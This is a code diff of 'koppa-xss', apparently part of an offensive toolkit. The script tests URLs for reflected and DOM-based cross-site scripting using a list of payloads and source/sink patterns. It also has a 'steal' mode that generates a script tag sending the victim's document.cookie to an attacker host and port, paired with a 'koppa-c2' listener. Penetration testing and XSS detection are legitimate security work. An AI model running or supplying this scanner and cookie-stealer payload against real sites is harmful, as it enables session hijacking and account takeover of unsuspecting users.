@@ -1,18 +1,17 @@
-# koppa-xss v1.0 — XSS scanner (reflected, stored, DOM)
-# Usage: koppa run koppa-xss <url> <param> [reflected|dom|steal]
+# koppa-xss v1.0 — XSS scanner
+# Usage: koppa run koppa-xss <url> [param] [reflected|dom|steal <lhost> <lport>]
 
-import http, fuzz, encode, parse, log, report
+import http, fuzz, encode, log, report, str
 
 let PAYLOADS = [
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
     "\"><script>alert(1)</script>",
     "<svg onload=alert(1)>",
-    "<details open ontoggle=alert(1)>",
-    "javascript:alert(1)"
+    "<details open ontoggle=alert(1)>"
 ]
-let DOM_SOURCES = ["document.URL", "location.hash", "location.search", "document.referrer"]
-let DOM_SINKS   = ["innerHTML", "document.write", "eval(", "setTimeout("]
+let DOM_SOURCES = ["document.URL", "location.hash", "location.search"]
+let DOM_SINKS   = ["innerHTML", "document.write", "eval("]
 
 fn cmd_reflected(url, param) {
     log.info("===== Reflected XSS: {url} [{param}] =====")
@@ -20,9 +19,11 @@ fn cmd_reflected(url, param) {
     for pay in PAYLOADS {
         let enc  = encode.url_encode(pay)
         let resp = http.get("{url}?{param}={enc}")
-        if resp.body.contains(pay) {
-            log.success("[+] Reflected XSS!  Payload: {pay}")
-            findings.push(report.finding("Reflected XSS", "High", "Param: {param} | Payload: {pay}"))
+        let body = resp.body
+        let has_xss = str.contains(body, pay)
+        if has_xss {
+            log.success("[+] Reflected XSS! Payload: {pay}")
+            findings.push(report.finding("Reflected XSS", "High", "Param: {param}"))
         }
     }
     if findings.len == 0 { log.warn("[-] No reflected XSS found") }
@@ -35,7 +36,9 @@ fn cmd_dom(url) {
     let src  = resp.body
     for source in DOM_SOURCES {
         for sink in DOM_SINKS {
-            if src.contains(source) and src.contains(sink) {
+            let has_src  = str.contains(src, source)
+            let has_sink = str.contains(src, sink)
+            if has_src and has_sink {
                 log.success("[+] Potential DOM XSS: {source} -> {sink}")
             }
         }
@@ -46,29 +49,26 @@ fn cmd_stealer(lhost, lport) {
     log.info("===== Cookie Stealer Payload =====")
     let pay = "<script>new Image().src='http://{lhost}:{lport}/?c='+document.cookie</script>"
     log.success("[+] Payload: {pay}")
-    log.info("    Start listener with: koppa-c2 {lhost} {lport}")
+    log.info("    Listener: koppa-c2 {lhost} {lport}")
     return pay
+}
+
+fn run_xss(url, param, mode) {
+    if mode == "reflected" or not mode { cmd_reflected(url, param) }
+    if mode == "dom"   { cmd_dom(url) }
+    if mode == "steal" { cmd_stealer(__args__[3], __args__[4]) }
+    log.success("XSS scan complete!")
 }
 
 fn main() {
     let url   = __args__[0]
     let param = __args__[1]
     let mode  = __args__[2]
-
+    log.info("===== KOPPA XSS Scanner v1.0 =====")
+    if url {
+        run_xss(url, param, mode)
+    }
     if not url {
         log.warn("Usage: koppa run koppa-xss <url> [param] [reflected|dom|steal <lhost> <lport>]")
-        return
     }
-
-    log.info("===== KOPPA XSS Scanner v1.0 =====")
-
-    if not mode or mode == "reflected" { cmd_reflected(url, param) }
-    if mode == "dom"   { cmd_dom(url) }
-    if mode == "steal" {
-        let lhost = __args__[3]
-        let lport = __args__[4]
-        cmd_stealer(lhost, lport)
-    }
-
-    log.success("XSS scan complete!")
 }
